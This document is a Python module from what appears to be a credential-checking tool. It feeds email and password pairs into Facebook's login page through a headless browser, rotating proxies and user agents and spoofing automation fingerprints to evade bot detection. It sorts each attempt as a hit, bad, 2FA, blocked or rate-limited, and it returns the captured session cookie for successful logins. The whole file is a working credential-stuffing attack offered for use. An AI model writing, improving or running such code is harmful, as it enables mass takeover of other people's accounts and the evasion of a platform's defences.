# modules/facebook.py
import asyncio
import random
from playwright.async_api import async_playwright, TimeoutError as PWTimeout
from core.checker import Credential


USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]


class Facebook:
    name = "facebook"

    LOGIN_URL = "https://www.facebook.com/login/"

    EMAIL_SELECTORS = [
        'input[name="email"]',
        '#email',
        '#m_login_email',
        'input[type="text"][name="email"]',
        'input[autocomplete="username"]',
        'input[aria-label*="Email"]',
        'input[aria-label*="email"]',
        'input[aria-label*="mobile"]',
    ]

    PASS_SELECTORS = [
        'input[name="pass"]',
        '#pass',
        '#m_login_password',
        'input[type="password"]',
        'input[aria-label*="Password"]',
        'input[aria-label*="password"]',
    ]

    LOGIN_SELECTORS = [
        'button[name="login"]',
        'button[type="submit"]',
        '#loginbutton',
        'button[data-testid="royal_login_button"]',
        'input[type="submit"]',
        'button:has-text("Log in")',
        'button:has-text("Log In")',
        'div[role="button"]:has-text("Log in")',
        'a[role="button"]:has-text("Log in")',
        'input[value="Log in"]',
        'input[value="Log In"]',
        'div[data-testid="login_button"]',
    ]

    COOKIE_SELECTORS = [
        'button[data-cookiebanner="accept_button"]',
        'button[data-testid="cookie-policy-manage-dialog-accept-button"]',
        'button[title="Allow all cookies"]',
        'button[title="Only allow essential cookies"]',
        'button[title="Accept All"]',
    ]

    @staticmethod
    def _parse_proxy_for_playwright(proxy_url: str | None) -> dict | None:
        if not proxy_url:
            return None
        raw = proxy_url.strip()
        if not raw:
            return None

        scheme = "http"
        if "://" in raw:
            scheme, raw = raw.split("://", 1)

        if "@" in raw:
            auth, host_port = raw.rsplit("@", 1)
            if ":" in auth:
                user, pw = auth.split(":", 1)
                return {
                    "server": f"{scheme}://{host_port}",
                    "username": user,
                    "password": pw,
                }
            return {"server": f"{scheme}://{host_port}"}

        return {"server": f"{scheme}://{raw}"}

    async def _try_selectors(self, page, selectors: list, timeout: int = 8000):
        for sel in selectors:
            try:
                el = await page.wait_for_selector(sel, timeout=timeout, state="visible")
                if el:
                    return el
            except Exception:
                continue
        return None

    async def run(self, cred: Credential, proxy: str | None = None) -> dict:
        async with async_playwright() as p:
            launch_args = {
                "headless": True,
                "args": [
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu",
                    "--window-size=1366,768",
                ],
            }
            proxy_conf = self._parse_proxy_for_playwright(proxy)
            if proxy_conf:
                launch_args["proxy"] = proxy_conf

            try:
                browser = await p.chromium.launch(**launch_args)
            except Exception as e:
                return {"status": "ERROR", "detail": f"launch_{type(e).__name__}: {str(e)[:150]}"}

            try:
                context = await browser.new_context(
                    user_agent=random.choice(USER_AGENTS),
                    viewport={"width": 1366, "height": 768},
                    locale="en-US",
                    timezone_id="America/New_York",
                    java_script_enabled=True,
                )

                await context.add_init_script("""
                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
                    window.chrome = {runtime: {}};
                """)

                page = await context.new_page()
                page.set_default_timeout(30000)

                # 1. Login sahifasini ochish
                try:
                    await page.goto(self.LOGIN_URL, wait_until="domcontentloaded", timeout=40000)
                except PWTimeout:
                    await browser.close()
                    return {"status": "ERROR", "detail": "goto_timeout"}
                except Exception as e:
                    await browser.close()
                    return {"status": "ERROR", "detail": f"goto_{type(e).__name__}: {str(e)[:150]}"}

                # 2. Cookie banner
                for sel in self.COOKIE_SELECTORS:
                    try:
                        await page.click(sel, timeout=1500)
                        break
                    except Exception:
                        continue

                # 3. Sahifa yuklanishini kutish
                try:
                    await page.wait_for_load_state("domcontentloaded", timeout=20000)
                except Exception:
                    pass

                await asyncio.sleep(3)

                # 4. Email maydoni
                email_field = await self._try_selectors(page, self.EMAIL_SELECTORS, timeout=10000)
                if not email_field:
                    try:
                        safe = cred.email.split("@")[0].replace(".", "_")[:30]
                        await page.screenshot(path=f"output/debug_{safe}.png", full_page=True)
                    except Exception:
                        pass
                    try:
                        page_url = page.url
                        page_title = await page.title()
                    except Exception:
                        page_url = "unknown"
                        page_title = "unknown"
                    await browser.close()
                    return {
                        "status": "ERROR",
                        "detail": f"email_not_found | url={page_url[:120]} | title={page_title[:60]}",
                    }

                # 5. Email kiritish
                try:
                    await email_field.click()
                    await email_field.fill(cred.email)
                except Exception as e:
                    await browser.close()
                    return {"status": "ERROR", "detail": f"email_fill_{type(e).__name__}"}

                await asyncio.sleep(0.5)

                # 6. Parol maydoni
                pass_field = await self._try_selectors(page, self.PASS_SELECTORS, timeout=6000)
                if not pass_field:
                    try:
                        safe = cred.email.split("@")[0].replace(".", "_")[:30]
                        await page.screenshot(path=f"output/debug_{safe}_nopass.png", full_page=True)
                    except Exception:
                        pass
                    await browser.close()
                    return {"status": "ERROR", "detail": "pass_field_not_found"}

                try:
                    await pass_field.click()
                    await pass_field.fill(cred.password)
                except Exception as e:
                    await browser.close()
                    return {"status": "ERROR", "detail": f"pass_fill_{type(e).__name__}"}

                await asyncio.sleep(0.5)

                # 7. Login tugmasi — bir nechta urinish
                login_btn = await self._try_selectors(page, self.LOGIN_SELECTORS, timeout=5000)

                submitted = False

                # 7a. Tugma topilsa — bosish
                if login_btn:
                    try:
                        await login_btn.click()
                        submitted = True
                    except Exception:
                        pass

                # 7b. Topilmasa — Enter bosish (parol maydonida)
                if not submitted:
                    try:
                        await pass_field.press("Enter")
                        submitted = True
                    except Exception:
                        pass

                # 7c. Hali ham bo'lmasa — form submit
                if not submitted:
                    try:
                        await page.evaluate("""
                            () => {
                                const forms = document.querySelectorAll('form');
                                for (const f of forms) {
                                    if (f.querySelector('input[type="password"]')) {
                                        f.submit();
                                        return true;
                                    }
                                }
                                return false;
                            }
                        """)
                        submitted = True
                    except Exception:
                        pass

                # 7d. Hech biri ishlamasa — xato
                if not submitted:
                    try:
                        safe = cred.email.split("@")[0].replace(".", "_")[:30]
                        await page.screenshot(path=f"output/debug_{safe}_nologin.png", full_page=True)
                    except Exception:
                        pass
                    await browser.close()
                    return {"status": "ERROR", "detail": "login_button_not_found"}

                # 8. Natijani kutish
                try:
                    await page.wait_for_load_state("networkidle", timeout=20000)
                except Exception:
                    pass

                await asyncio.sleep(3)

                final_url = page.url.lower()
                try:
                    html = await page.content()
                except Exception:
                    html = ""

                cookies = await context.cookies()
                cookie_names = {c["name"] for c in cookies}

                # Natija screenshot
                if "c_user" not in cookie_names:
                    try:
                        safe = cred.email.split("@")[0].replace(".", "_")[:30]
                        await page.screenshot(path=f"output/result_{safe}.png", full_page=True)
                    except Exception:
                        pass

                await browser.close()

                # 9. Natijani tahlil qilish
                # HIT
                if "c_user" in cookie_names:
                    return {
                        "status": "HIT",
                        "detail": "login_success",
                        "c_user": next((c["value"] for c in cookies if c["name"] == "c_user"), None),
                    }

                html_lower = html.lower()

                # BAD
                bad_signals = [
                    "password that you've entered is incorrect",
                    "the password you entered is incorrect",
                    "invalid username or password",
                    "entered an incorrect password",
                    "find your account and log in",
                    "you entered an incorrect password",
                    "incorrect password",
                ]
                if any(s in html_lower for s in bad_signals):
                    return {"status": "BAD", "detail": "invalid_credentials"}

                # 2FA
                if (
                    "checkpoint" in final_url
                    or "/two_step_verification" in final_url
                    or "/login/checkpoint" in final_url
                    or "approvals_code" in html
                    or "two-factor authentication" in html_lower
                    or "two_step_verification" in html_lower
                ):
                    return {"status": "2FA", "detail": "checkpoint_required"}

                # BLOCKED
                if (
                    "temporarily blocked" in html_lower
                    or "you're temporarily blocked" in html_lower
                ):
                    return {"status": "BLOCKED", "detail": "temporarily_blocked"}

                # RATE
                if "try again later" in html_lower or "too many" in html_lower:
                    return {"status": "RATE", "detail": "rate_limited"}

                return {
                    "status": "ERROR",
                    "detail": f"unknown_url={final_url[:120]}",
                }

            except Exception as e:
                try:
                    await browser.close()
                except Exception:
                    pass
                return {"status": "ERROR", "detail": f"{type(e).__name__}: {str(e)[:150]}"}